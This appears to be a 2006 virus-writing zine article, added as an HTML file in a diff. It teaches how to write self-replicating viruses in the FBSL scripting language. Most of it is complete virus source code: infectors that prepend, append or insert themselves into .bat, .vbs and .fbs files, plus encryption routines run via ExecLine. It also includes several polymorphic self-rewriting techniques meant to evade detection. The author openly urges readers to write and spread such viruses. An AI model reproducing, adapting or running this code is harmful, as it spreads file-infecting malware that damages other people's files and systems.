@@ -1,0 +1,506 @@
+<html><head><title>EOF ISSUE #0x01</title>
+<style fprolloverstyle>A:hover {color: #D1F2C4; text-decoration: none}</style></head>
+<body text="#E0E0E0" bgcolor="#131313" link="#BFBFBF" vlink="#BFBFBF" alink="#BFBFBF" style="font-size: 10pt">
+
+<pre><hr>|| Author: Genetix/DoomRiderz || <a style="text-decoration: none" href="../mainmenu/articles.htm"><span style="text-decoration: none">Back to articles</span></a> ||<hr></pre>
+<pre>
+                                             FBSL (FUNNY BASIC STUPID LANGUAGE)
+                                                          Genetix/2006
+
+
+
+Infection:
+-Prepender &amp; adding trash
+-Appender
+-EPO
+
+Encryption:
+--Encryption, adding ascii codes
+
+Polymorphic:
+---Polymorphic, prepender &amp; adding trash
+---Polymorphic, letter case changing
+---Polymorphic, Variable changing
+---Polymorphic, Joining lines
+
+Other:
+----Polycryption *
+
+About FBSL: 'Freestyle Basic Script Language'
+At first FBSL looks alot like VB. It has some common Pascal, C functions too.
+It's in early stages, not YET supporting arrays.. But it was fun to write these code's in this language! 
+Hope someone somewhere starts creating viruses with this! It's able to compile into exe files.. 
+you could write a virus to infect exe files made with FBSL. I've not done that yet, I think this is enough, but
+would like to see that!
+
+
+
+Prepender &amp; PolyMorphic-
+
+In this example i included the polymorphism. So instead of making another section just for adding trash-poly, i build it into 
+the prepender. There are some more polymorphism tricks in this article.
+
+==============================Prepending - Polymorphic (adding trash lines)=========================================
+
+#OPTION EXPLICIT
+$AppType CONSOLE
+#Genetix
+'Polymorphic/prepender.. changes random lines to uppercase &amp; lowercase &amp; add's trash comments
+
+DIM %fp , %maxbuff = 100, $sBuff
+DIM $x, %FileList, $j, %LINE, $op, $ss, %i
+FileList = ScNew()
+
+Begin Const
+    InfMarker = &quot;#Genetix&quot;
+    InfEnd = &quot;#End&quot;
+    TrashMark = &quot;'&quot;
+End Const
+
+x = FindFirst( &quot;*.*&quot; )
+WHILE x &lt;&gt; &quot;&quot;
+    x = FindNext
+    ScAdd( FileList, x )
+WEND
+
+FOR i = 1 TO ScGetCount(FileList)
+    RANDOMIZE
+    IF INSTR(scIndexAt( FileList, i ), &quot;.bat&quot;) THEN
+        op = FileOpen( scIndexAt( FileList, i ), &quot;APPEND&quot; )
+        ss = FileLoad(scIndexAt( FileList, i ))
+        IF InStr(ss, InfMarker) = &quot;&quot; Then
+        j = FileOpen( scIndexAt( FileList, i ), &quot;OUTPUT&quot; )
+        fp = Fileopen( COMMAND(1), binary_input )
+        WHILE NOT Fileeof( fp )
+            sBuff = FileGets(fp, maxbuff)
+            IF sBuff = InfEnd THEN EXIT WHILE
+            IF LEFT( sBuff, - LEN(sBuff) + 2 ) &lt;&gt; TrashMark THEN
+            IF Randint(1, 3) = 3 THEN
+            sBuff = Lcase(sBuff)
+            ELSE
+            sBuff = Ucase(sBuff)
+            END IF
+                IF Randint(1, 4) = 3 THEN
+                    FilePrint( j, TrashMark &amp; Trash(Randint(20, 80)))
+                    FilePrint( j, sBuff)
+                ELSE
+                    FilePrint( j, sBuff)
+                END IF
+            END IF
+        WEND
+        FilePrint( j, crlf &amp; InfEnd)
+        FilePrint( op, ss)
+        Fileclose( fp )
+        FileClose(j)
+        FileClose(op)
+    END IF
+END IF
+NEXT i
+ScFinalize( FileList )
+
+pause
+
+function trash(%lenx)
+dim $re
+    for i = 1 to val(lenx)
+        re = re &amp; Chr(Randint(97,122))
+    next i
+return re
+end function
+
+#END
+
+======================================================END==========================================================
+The virus searches for a victim, it first opens itself and reads the entire victims code into a variable. After this
+it will open itself and and search from top to the 'end marker, then it does a random number looping throu the code
+and changing random lines to Ucase and Lcase, after that it add's trash to itself, infects the victim and.. it's
+all over.
+
+
+
+
+Appender for FBSL.
+
+we looove them!
+
+======================================================Appender======================================================
+
+'start
+
+OPTION EXPLICIT
+#AppType CONSOLE
+
+DIM $line1, $line2, Code1 = ScNew(), Code2 = ScNew()
+DIM %fp, %c, %i, %FileList, %x, %op
+
+BEGIN CONST
+    infEnd = &quot;'end&quot;
+    infStart = &quot;'start&quot;
+END CONST
+
+x = FindFirst( &quot;*.vbs&quot; )
+   WHILE x &lt;&gt; &quot;&quot;
+        x = FindNext
+        ScAdd( FileList, x )
+   WEND
+
+FOR x = 1 TO ScGetCount(FileList)
+
+    fp = Fileopen(COMMAND(1), INPUT )
+    WHILE NOT Fileeof( fp )
+        line1 = FileInput(fp)
+        IF line1 = infStart THEN EXIT WHILE
+    WEND
+
+    WHILE NOT Fileeof( fp )
+        $line1 = FileInput(fp)
+        IF line1 = infEnd THEN EXIT WHILE
+        ScAdd( Code2, line1 )
+    WEND
+
+    Fileclose( fp )
+
+    FOR c = 1 TO ScGetCount(code1)
+        Other = Other &amp; crlf &amp; ScIndexAt( code1, c )
+    NEXT c
+
+    FOR i = 1 TO ScGetCount(Code2)
+        all = all &amp; crlf &amp; ScIndexAt( Code2, i )
+    NEXT i
+
+    op = FileOpen( scIndexAt( FileList, x ), &quot;APPEND&quot; )
+    FilePrint(op, infStart &amp; crlf &amp; all &amp; crlf &amp; infEnd)
+    FileClose(op)
+NEXT
+
+'end
+
+===================================================================================================================
+This explains itself, it's just like the prepender.. instead it seaches itself for 'start &amp; 'end then extracts the code 
+and appends to the victims. That's all to say on this.
+
+
+
+
+EPO virus for the FBSL. 
+==============================Prepening inside subroutines befor End Sub============================================
+
+'start
+OPTION EXPLICIT
+#AppType CONSOLE
+DIM %fp , $sBuff, %code = ScNew(), %i, $all
+DIM %self, $some, $ps, $LINE, %codeS = ScNew(), %x, $szLine
+DIM $a, $b, codeB = ScNew(), %c, $Other, %j, $szLine, %r, %FileList = ScNew()
+BEGIN CONST
+    final = &quot;end sub&quot;
+    infEnd = &quot;'end&quot;
+    infStart = &quot;'start&quot;
+    lBreak = crlf
+    ext = &quot;.fbs&quot;
+END CONST
+r = FindFirst( &quot;*.*&quot; )
+WHILE x &lt;&gt; &quot;&quot;
+    r = FindNext
+    ScAdd( FileList, r )
+WEND
+FOR r = 1 TO ScGetCount(FileList)
+    IF INSTR(scIndexAt( FileList, r ), ext) THEN
+        fp = Fileopen(scIndexAt( FileList, r ), INPUT )
+        WHILE NOT Fileeof( fp )
+            sBuff = FileInput(fp)
+            IF sBuff = final THEN EXIT WHILE
+            ScAdd( code, sBuff )
+            WEND
+            WHILE NOT Fileeof( fp )
+                sBuff = FileInput(fp)
+                ScAdd( codeB, sBuff )
+            WEND
+            Fileclose( fp )
+            FOR c = 1 TO ScGetCount(codeB)
+                Other = Other &amp; crlf &amp; ScIndexAt( codeB, c )
+            NEXT c
+            FOR i = 1 TO ScGetCount(code)
+                all = all &amp; crlf &amp; ScIndexAt( code, i )
+            NEXT i
+            fp = FileOpen(COMMAND(1), INPUT)
+            WHILE NOT Fileeof( fp )
+                szLine = FileInput(fp)
+                IF szLine = infStart THEN
+                    b = szline
+                    EXIT WHILE
+                END IF
+            WEND
+            WHILE NOT Fileeof( fp )
+                szLine = FileInput(fp)
+                IF szLine = infEnd THEN
+                    EXIT WHILE
+                ELSE
+                    ScAdd( codeS, szLine )
+                END IF
+            WEND
+            FileClose(fp)
+            FOR x = 1 TO ScGetCount(codeS)
+                a = a &amp; crlf &amp; ScIndexAt( codeS, x )
+            NEXT x
+            some = all &amp; lBreak &amp; infStart &amp; lBreak &amp; a &amp; lBreak &amp; infEnd &amp; lBreak &amp; final &amp; lBreak &amp; Other
+            j = FileOpen(scIndexAt( FileList, r ), &quot;OUTPUT&quot; )
+            FilePrint( j, some)
+            FileClose(j)
+    END IF
+NEXT r
+ScFinalize( code )
+ScFinalize( codeS )
+ScFinalize( codeB )
+'end
+
+======================================================END==========================================================
+
+The virus first searches for &amp; creates an array-like list of all files in it's working dir.
+After this it checks the file extension for &quot;.fbs&quot; It then opens the file and searches line
+by line for &quot;end sub&quot; putting each line befor it into an array. the next step is to continue 
+reading the file until EOF. After this is done the virus has the posision of the place to infect
+and it has the other half of the victims file to put back after infection. so now it needs to find itself!
+Command(1) is the pointer to any fbsl script, so it reads itself and searches for &quot;start&quot; 
+then &quot;end&quot; and extracts the code between those markers (the virus code). then it stores all this
+stupid data into a variable. Opens the victim and infects her/him/it the pet dog......? easy!
+
+
+Encryption!
+
+Here is a simple way of encrypting some message.. or the entire virus itself!
+
+===================================================Encryption=======================================================
+
+#option Explicit
+$AppType CONSOLE
+Dim $code, $st, %i, $norm
+
+code = (&quot;y{rw})+qnuux+&quot;)
+
+for i = 1 to len(code)
+norm = norm &amp; chr(asc(mid(code,i,1)) - 9)
+next
+
+ExecLine(norm)
+
+==========================================================END=========================================================
+
+Code variable holds the encrypted code that when decrypted will display a message. This is easy well known encryption
+by adding 9 to each ASCII character code. A + 9 = I
+ExecLine 
+
+ExecLine function Executes the content of the variable holding the code at runtime.
+
+
+
+Polymorphic: Changing Ucase &amp; Lcase randomly
+
+This is a vary old method.. but anyway i want to include it here!
+
+==================================================Lcase/Ucase poly====================================================
+
+#oPtioN expliCIt
+$apptyPe conSolE
+DiM $coDe, %OPENOWn
+
+COdE = PolY(FilELOAD(cOMmand(1)))
+
+
+fUNcTIon poLy(stR)
+dim $TmP, %i, %q
+raNDOmiZE
+For I = 1 To STRLEn(STr)
+      iF RAnDint(1,2) = 2 THEn
+      TmP = tmP &amp; LcAse(MId(STR,i,1))
+      elsE
+      tMp = Tmp &amp; UcaSe(mid(sTR,i,1))
+      enD if
+NExT
+RetuRN tmp
+eND FUNCtIoN
+
+OPeNoWN = FiLeOpeN(COmMaND(1), &quot;oUtPUt&quot; )
+fiLEpRInt(oPENoWn, CodE)
+fileCLose(openown)
+
+=========================================================END============================================================
+
+The virus opens itself into the poly function, the function loops the length of each line and with a random number decides 
+what letter in that line should be Lcase'd - Ucase'd. Once this is finished the virus writes the new code into intself.
+It's useless for anti-virus but i still like it!
+
+
+
+Polymorphic: Variable name chanhing
+
+Due to this language not supporting arrays it was no other way but to use the following method to get this working.
+
+=================================================Variable name changing===================================================
+
+#option Explicit
+$AppType CONSOLE
+
+Dim Array = ScNew()
+Dim %i, $result, %fp, $sBuff
+Dim %p, $r, $NewCode, $OpenMe
+
+        fp = Fileopen(Command(1), INPUT )
+        WHILE NOT Fileeof( fp )
+            sBuff = FileInput(fp)
+            ScAdd( Array, sBuff)
+        wend
+        Fileclose( fp )
+
+
+for i = 1 to ScGetCount(Array)
+    result = result &amp; crlf &amp; ScIndexAt( Array, i )
+next
+
+
+NewCode = NameChange(result)
+
+            OpenMe = FileOpen(Command(1), &quot;OUTPUT&quot; )
+            FilePrint( OpenMe, NewCode)
+            FileClose(OpenMe)
+
+function polymorph(%lenx)
+dim $re
+    for i = 1 to val(lenx)
+        re = re &amp; Chr(Randint(97,122))
+    next i
+return re
+end function
+
+function NameChange(code)
+raNDOmiZE
+result = replace(code,&quot;result&quot;, polymorph(RandInt(5,10))) : result = replace(code,&quot;Array&quot;, polymorph(RandInt(5,10)))
+result = replace(code,&quot;fp&quot;, polymorph(RandInt(5,10))) : result = replace(code,&quot;NameChange&quot;, polymorph(RandInt(5,10)))
+result = replace(code,&quot;sBuff&quot;, polymorph(RandInt(5,10))) : result = replace(code,&quot;polymorph&quot;, polymorph(RandInt(5,10)))
+result = replace(code,&quot;lenx&quot;, polymorph(RandInt(5,10))) : result = replace(code,&quot;NewCode&quot;, polymorph(RandInt(5,10)))
+result = replace(code,&quot;OpenMe&quot;, polymorph(RandInt(5,10))) : result = replace(code,&quot;code&quot;, polymorph(RandInt(5,10)))
+return result
+End Function
+
+==============================================================END=========================================================
+
+First the virus opens itself and read's line by line adding each line to the &quot;string collection&quot; it's the closest thing to 
+arrays in FBSL. It then loops through the lines collected in the string collectiong joining each line to &quot;result&quot; variable.
+NewCode calles a function to replace each variable with a random set of letters with a random laengh 5 - 10, It then
+Now that NewCode has the modified code the virus opens itself for write access and inputs it's new code. simple!
+
+
+Polymorphic: Joining lines
+
+this can be improved.
+I've not seen this used befor but here it is in fbsl.
+==========================================================Joining lines===================================================
+
+option Explicit
+#AppType CONSOLE
+Dim $line1,  Code2 = ScNew()
+Dim %fp, %i, %op
+fp = Fileopen(Command(1), Input )
+While Not Fileeof( fp )
+   line1 = FileInput(fp) 
+   ScAdd(Code2, line1)
+Wend
+Fileclose( fp )
+Randomize
+For i = 1 To ScGetCount(Code2)
+    if instr(ScIndexAt( Code2, i ), chr(58)) then 
+        replace (ScIndexAt( Code2, i ), chr(58), chr(13) &amp; chr(10))
+    end if
+    if RandInt(1,8) = 3 then
+        all = all &amp; chr(58) &amp; ScIndexAt( Code2, i )
+    else
+        all = all &amp; crlf &amp; ScIndexAt( Code2, i )
+   end if
+Next i
+op = FileOpen(Command(1), OUTPUT )
+FilePrint(op, all)
+FileClose(op)
+
+===============================================================END=========================================================
+
+The code opens itelf and reads eachline into the string collection. It loops through each line in the string collection
+first seaching for &quot;:&quot; in the line and replacing them with a new line (like pressing the enter key) then it decides
+with a random number what lines to join together. Most languages support this, in fbsl it's the same as vbs, vb ect..
+when that's done it writes the new code into itself. ok boooring, but i like it! *sings*
+
+
+
+Polymorphic: Polycryption
+
+This is a cross between polymorphism &amp; encryption. Was just a random idea while playing with some encryption in C#
+Probably old method? not seen it befor thou. So here it is!
+
+========================================================Polycryption======================================================
+
+#OPTION EXPLICIT
+$AppType CONSOLE
+
+DIM $Code
+
+Code = x(&quot;uwnsy%'Utq~2Hw~uynts%g~?%Ljsjyn}'5&quot;) 'The encrypted code with key appended to it
+
+FUNCTION x($STR)
+    DIM $txt
+    DIM %rndKey
+    DIM $tmp
+    DIM $result
+    DIM $rtn
+    DIM $original
+    DIM $KEY
+    DIM $self
+    DIM $OpenMe
+    DIM %i
+    original = STR  'original string must be stored so it knows what to replace!
+
+    self = FileLoad(COMMAND(1))   'load itself
+
+    KEY = RIGHT(STR, 1) 'the key is stored at the end of the encrypted string, get the key! or shall we just guess it?
+    FOR i = 1 TO LEN(STR)
+        rtn = rtn &amp; CHR(ASC(MID(STR, i, 1)) - VAL(KEY)) 'restore the encrypted string.. how else can i explain this line??
+    NEXT
+    rtn = MID(rtn, 1, LEN(rtn) - 1) 'take away the key from the string because it's junk at this point.
+
+    ExecLine(rtn) 'execute the decrypted code
+
+    RANDOMIZE
+    rndKey = RandInt(1, 4) 'create a new random key
+    FOR i = 1 TO LEN(rtn)
+        tmp = tmp &amp; CHR(ASC(MID(rtn, i, 1)) + rndKey) 're-encrypt the code with the new key!
+    NEXT
+    result = tmp &amp; rndKey 'gives the encrypted code to the variable &quot;result&quot; and append's the key
+
+    'last, open itself, replace the decrypted code with the new encrypted code.. polymorphic &amp; encryption at the same time!
+    OpenMe = FileOpen(COMMAND(1), OUTPUT)
+    FilePrint(OpenMe, REPLACE(self, original, result))
+    FileClose(OpenMe)
+
+END FUNCTION
+
+=========================================================================================================================
+
+yey i love this! i commented the code instead of writing to much here (being lazy again!) 
+
+
+
+---
+
+I think im done with FBSL now.. so, hope you enjoy reading this &amp; go write some fbsl virus !!!
+
+Now some comments to my friendly friends!~ in alphabetical order!
+MikeAce      ~YOU HAVE A G/F!!!!! lol
+Retro        ~thx for always helping me :) and not wanting sex for it...
+SPTH         ~because this &quot;tutorial?&quot; is kinda in the same format as he writes his.... but mine is better *laughs*
+SkyOut       ~HOPE!
+blueowl      ~where the hell was the hello to me in rrlf like you promised!?!?!?!?!?!??!
+dr3f         ~I want your bot's when you die! *KILLS YOU*
+falckon      ~genetical? falckonisity!
+kefi         ~I MISS YOOOOOOOOOOOOOOOOOOUUWWWWWWWWW!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! :(
+synge        ~hello hello hello hello hello hello hello hello hello.. bye
+
+And to all eof members: I'm the best! :p
+If your name is missing it's because i don't like you... or i just forgot, you choose!
+</pre></body></html>
